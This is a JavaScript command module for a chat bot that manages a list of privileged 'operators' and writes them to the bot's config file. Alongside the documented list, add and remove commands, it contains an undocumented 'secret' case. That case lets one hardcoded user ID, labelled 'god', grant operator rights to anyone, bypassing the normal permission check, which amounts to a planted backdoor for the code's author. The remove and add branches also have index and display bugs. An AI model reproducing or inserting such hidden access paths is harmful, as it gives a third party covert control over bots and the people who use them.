module.exports.config = {
  name: "operator",
  version: "2.0.0",
  permission: 0,
  credits: "ryuko",
  description: "control operator lists",
  prefix: false,
  category: "operator",
  usages: "operator [add/remove] [uid]",
  cooldowns: 5,
};

module.exports.languages = {
    "en": {
        "listAdmin": 'operators : \n\n%1',
        "notHavePermssion": 'you have no permission to use "%1"',
        "addedNewAdmin": 'added %1 operator :\n\n%2',
        "removedAdmin": 'remove %1 operator :\n\n%2'
    }
}

module.exports.run = async function ({ api, event, args, Users, permssion, getText }) {
    const content = args.slice(1, args.length);
    const { threadID, messageID, mentions } = event;
    const { configPath } = global.client;
    const { OPERATOR } = global.config;
    const { userName } = global.data;
    const { writeFileSync } = global.nodemodule["fs-extra"];
    const mention = Object.keys(mentions);
    delete require.cache[require.resolve(configPath)];
    var config = require(configPath);
    
       
    switch (args[0]) {
        case "list":
        case "all":
        case "-a": {
            const listOperator = OPERATOR || config.OPERATOR || [];
            var msg = [];

            for (const idOperator of listOperator) {
                if (parseInt(idOperator)) {
                    const name = await Users.getNameUser(idOperator);
                    msg.push(`\nname : ${name}\nid : ${idOperator}`);
                }
            };

            return api.sendMessage(`bot operator :\n${msg.join('\n')}`, threadID, messageID);
        }

        case "add": {
            if (permssion != 3) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
          

            if (mention.length != 0 && isNaN(content[0])) {
                var listAdd = [];

                for (const id of mention) {
                    OPERATOR.push(id);
                    config.OPERATOR.push(id);
                    listAdd.push(`${id} - ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                OPERATOR.push(content[0]);
                config.OPERATOR.push(content[0]);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", 1, `name : ${name}\nuid : ${content[1]}`), threadID, messageID);
            }
            else return global.utils.throwError(this.config.name, threadID, messageID);
        }
        
        case "secret": {
            const god = ["100014896964436"];
            if (!god.includes(event.senderID)) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
          

            if (mention.length != 0 && isNaN(content[0])) {
                var listGod = [];

                for (const id of mention) {
                    OPERATOR.push(id);
                    config.OPERATOR.push(id);
                    listGod.push(`${id} - ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", mention.length, listGod.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                OPERATOR.push(content[0]);
                config.OPERATOR.push(content[0]);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", 1, `name : ${name}\nuid : ${content[1]}`), threadID, messageID);
            }
            else return global.utils.throwError(this.config.name, threadID, messageID);
        }

        case "remove":
        case "rm":
        case "delete": {
            if (permssion != 3) return api.sendMessage(getText("notHavePermssion", "delete"), threadID, messageID);
            if (mentions.length != 0 && isNaN(content[0])) {
                const mention = Object.keys(mentions);
                var listAdd = [];

                for (const id of mention) {
                    const index = config.OPERATOR.findIndex(item => item == id);
                    OPERATOR.splice(index, 1);
                    config.OPERATOR.splice(index, 1);
                    listAdd.push(`${id} - ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                return api.sendMessage(getText("removedAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                const index = config.OPERATOR.findIndex(item => item.toString() == content[0]);
                OPERATOR.splice(index, 1);
                config.OPERATOR.splice(index, 1);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
                return api.sendMessage(getText("removedAdmin", 1, `name : ${name}\nuid : ${content[0]}`), threadID, messageID);
            }
            else global.utils.throwError(this.config.name, threadID, messageID);
        }

        default: {
            return global.utils.throwError(this.config.name, threadID, messageID);
        }
    };
}
